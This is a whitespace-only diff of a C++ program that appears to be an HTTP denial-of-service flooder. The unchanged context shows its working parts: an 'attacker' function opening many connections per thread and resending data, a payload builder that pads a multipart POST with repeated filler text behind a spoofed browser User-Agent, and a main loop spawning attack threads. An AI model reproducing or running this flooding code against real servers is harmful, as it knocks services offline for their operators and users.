@@ -252,7 +252,7 @@ void attacker(string *payload, string *host, string *port, int numConns, bool gz
         
         for(int i = 0; i < numConns; ++i)
         {
-        	if(send(sockfd[i], data.c_str(), data.size(), MSG_NOSIGNAL) < 0)
+            if(send(sockfd[i], data.c_str(), data.size(), MSG_NOSIGNAL) < 0)
     	    {
                 close(sockfd[i]);
                 sockfd[i] = doConnect(payload, host, port);
@@ -287,16 +287,16 @@ string buildPayload(string host, string path, float fileSize, int numFiles, bool
 
     //Build the body
     for(int i = 0; i < numFiles; ++i)
-	{
-		body << "-----------------------------424199281147285211419178285\r\n";
-		body << "Content-Disposition: form-data; name=\"" << gen_random(10) << "\"; filename=\"" << gen_random(10) << ".txt\"\r\n";
-		body << "Content-Type: text/plain\r\n\r\n";
+    {
+	body << "-----------------------------424199281147285211419178285\r\n";
+	body << "Content-Disposition: form-data; name=\"" << gen_random(10) << "\"; filename=\"" << gen_random(10) << ".txt\"\r\n";
+	body << "Content-Type: text/plain\r\n\r\n";
 
     	for(int n = 0; n < (int)(fileSize*100000); ++n)
     	{
-    		body << "aaaaaaaaa\n";
+    	    body << "aaaaaaaaa\n";
     	}
-	}
+    }
 
     //If we want to end the stream of files, add ending boundary
     if(endFile)
@@ -306,12 +306,12 @@ string buildPayload(string host, string path, float fileSize, int numFiles, bool
 	
     //Build headers
     payload << "POST " << path.c_str() << " HTTP/1.1\r\n";
-	payload << "Host: " << host.c_str() << "\r\n";
+    payload << "Host: " << host.c_str() << "\r\n";
     payload << "User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:31.0) Gecko/20100101 Firefox/31.0\r\n";
-	payload << "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\n";
-	payload << "Accept-Language: en-US,en;q=0.5\r\n";
-	payload << "Accept-Encoding: gzip, deflate\r\n";
-	payload << "Cache-Control: max-age=0\r\n";
+    payload << "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\n";
+    payload << "Accept-Language: en-US,en;q=0.5\r\n";
+    payload << "Accept-Encoding: gzip, deflate\r\n";
+    payload << "Cache-Control: max-age=0\r\n";
     payload << "Connection: keep-alive\r\n";
 
     if(gzip)
@@ -377,7 +377,7 @@ int main(int argc, char *argv[])
     bool endFile = atoi(argv[8]) == 1 ? true : false;
     bool gzip = atoi(argv[9]) == 1 ? true : false;
     float timeout = stof(argv[10]) < 0.1 ? 0.1 : stof(argv[10]);
-	vector<thread> threadVector;
+    vector<thread> threadVector;
 
     print("Building payload", true);
     srand(time(0));
@@ -385,7 +385,7 @@ int main(int argc, char *argv[])
     //cout << payload << endl;
 	
     print("Starting threads", true);
-   	for(int i = 0; i < numThreads; ++i)
+    for(int i = 0; i < numThreads; ++i)
     {
     	threadVector.push_back(thread(attacker, &payload, &host, &port, numConns, gzip, timeout));
         sleep(0.1);
